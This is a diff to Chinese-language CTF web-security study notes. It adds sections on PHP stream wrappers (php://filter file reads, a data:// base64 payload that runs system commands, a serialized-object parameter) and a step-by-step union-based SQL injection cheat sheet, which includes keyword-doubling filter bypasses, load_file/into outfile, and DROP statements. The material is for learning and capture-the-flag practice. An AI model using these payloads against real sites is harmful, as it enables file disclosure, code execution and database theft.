@@ -32,7 +32,7 @@
 
 显示指定资源的源代码，在右键无法用的时候可以在url的最前面输入`view-source:`来查看网页源代码。
 
-### php若类型
+### php弱类型
 
 ===会先比较两个变量的类型是否相同，在比较数值
 
@@ -281,4 +281,146 @@ http://220.249.52.133:52133/{{''.__class__.__mro__[2].__subclasses__()[40]('./fl
 # URL http://220.249.52.133:52133/ctf{f22b6844-5169-4054-b2a0-d95b9361cb57} not found
 
 ~~~
+
+### php伪协议
+
+php:// — 访问各个输入/输出流（I/O streams）
+
+* **php://input** 是个可以访问请求的原始数据的只读流.CTF中经常使用`file_get_contents`获取`php://input`内容(POST)，需要开启`allow_url_include`，并且当`enctype="multipart/form-data"`的时候 **php://input是无效**的。
+
+  * **利用方式：**`?file=php://input` 数据利用`POST`传过去
+
+  * 碰到**file_get_contents()**就要想到用**php://input**绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据。
+
+    ~~~php
+    ?user=php://input&file=php://filter/convert.base64-encode/resource=class.php
+    ?user=php://input&file=php://filter/convert.base64-encode/resource=index.php
+    ?user=php://input&file=class.php&pass=O:4:%22Read%22:1:{s:4:%22file%22;s:8:%22f1a9.php%22;}
+    ~~~
+
+    
+
+* **php://output** 是一个只写的数据流， 允许你以print和 echo 一样的方式 写入到输出缓冲区。
+
+* **php://filter** 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器
+
+  **php://filter 参数**
+
+  ~~~
+  resource=<要过滤的数据流>  这个参数是必须的。它指定了你要筛选过滤的数据流。
+  read=<读链的筛选列表> 该参数可选。可以设定一个或多个过滤器名称，以管道符（`|`）分隔
+  write=<写链的筛选列表>	该参数可选。可以设定一个或多个过滤器名称，以管道符（`|`）分隔。
+  <；两个链的筛选列表> 任何没有以 `read=` 或 `write=` 作前缀 的筛选器列表会视情况应用于读或写链。
+  ~~~
+
+  
+
+  ~~~
+  # 字符串过滤器
+  string.rot13
+  进行rot13转换
+  
+  string.toupper
+  将字符全部大写
+  
+  string.tolower
+  将字符全部小写
+  
+  string.strip_tags
+  去除空字符、HTML 和 PHP 标记后的结果。
+  功能类似于strip_tags()函数，若不想某些字符不被消除，后面跟上字符，可利用字符串或是数组两种方式。
+  
+  # 转换过滤器
+  
+  convert.base64-encode和 convert.base64-decode使用这两个过滤器等同于分别用 base64_encode()和 base64_decode()函数处理所有的流数据。 convert.base64-encode支持以一个关联数组给出的参数。如果给出了 line-length，base64 输出将被用 line-length个字符为 长度而截成块。如果给出了 line-break-chars，每块将被用给出的字符隔开。这些参数的效果和用 base64_encode()再加上 chunk_split()相同
+  
+  convert.quoted-printable-encode和 convert.quoted-printable-decode使用此过滤器的 decode 版本等同于用 quoted_printable_decode()函数处理所有的流数据。没有和 convert.quoted-printable-encode相对应的函数。 convert.quoted-printable-encode支持以一个关联数组给出的参数。除了支持和 convert.base64-encode一样的附加参数外， convert.quoted-printable-encode还支持布尔参数 binary和 force-encode-first。 convert.base64-decode只支持 line-break-chars参数作为从编码载荷中剥离的类型提示。
+  
+  ~~~
+
+  以下命令常用来读取文件
+
+  ~~~php
+  ?file=php://filter/read=convert.base64-encode/resource=index.php
+  ~~~
+
+* **data://**
+
+  php5.2.0起，数据流封装器开始有效，主要用于数据流的读取。如果传入的数据是PHP代码，就会执行代码
+
+  用法：
+
+  `data://text/plain;base64,`
+
+  `<?php system("dir")?>` base64编码后使用
+
+  `http://localhost/?page=data://text/plain/;base64,PD9waHAgc3lzdGVtKCJkaXIisssKT8%2b`(注意编码后的+号要URL编码)
+
+### php中大小写敏感规则
+
+* 区分大小写的：变量名、常量名、数组索引
+* 不区分大小写的：函数名、方法名、类名、魔术常量、NULL、TRUE、FALSE、强制类型转换
+
+### SQL注入
+
+手工注入步骤：
+
+1.判断是否存在注入，注入是字符型还是数字型
+
+2.猜解SQL查询语句中的字段数
+
+3.确定显示的字段顺序
+
+4.获取当前数据库
+
+5.获取数据库中的表
+
+6.获取表中的字段名
+
+7.下载数据
+
+
+
+GROUP_CONCAT()函数将组中的字符串连接成为具有各种选项的单个字符串。
+
+MySQL UNION 操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合中，要求字段数一致。
+
+~~~sql
+注入常见参数 
+user()：当前数据库用户
+database()：当前数据库名
+version()：当前使用的数据库版本
+@@datadir：数据库存储数据路径
+concat()：联合数据，用于联合两条数据结果。如 concat(username,password)
+group_concat()：和 concat() 类似，如 group_concat(DISTINCT+user,password)，用于把多条数据一次注入出来
+concat_ws()：用法类似
+hex() 和 unhex()：用于 hex 编码解码
+load_file()：以文本方式读取文件，在 Windows 中，路径设置为 \\
+select xxoo into outfile '路径'：权限较高时可直接写文件
+
+行间注释 
+'-- '   --后面有个空格
+DROP sampletable;--
+url里空格会被浏览器直接处理掉，就到不了数据库里。所以特意用加号代替。
+#
+DROP sampletable;#
+~~~
+
+
+
+~~~sql
+?id=1'  回显空白 -> 可能为单引号闭合
+?id=1'--+ 回显正常 -> 单引号闭合方式
+?id=1' and 1=1--+ 回显空白 -> 可能过滤了and
+?id=1' And 1=1--+ 回显空白 -> 可能过滤了大小写
+?id=1' anandd 1=1--+ 回显正常 -> 嵌套剥离绕过 过滤了and、or
+?id=1' oorrder by 3--+ ->列数为3
+
+?id=-1' uniunionon selselectect 1,group_concat(schema_name),3 from infoorrmation_schema.schemata--+
+?id=-1' uniunionon selecselectt 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema='web18'--+
+?id=-1' uniunionon selecselectt 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_name='flag'--+
+?id=-1' uniunionon selecselectt 1,flag,3 from flag--+
+~~~
+
+
 
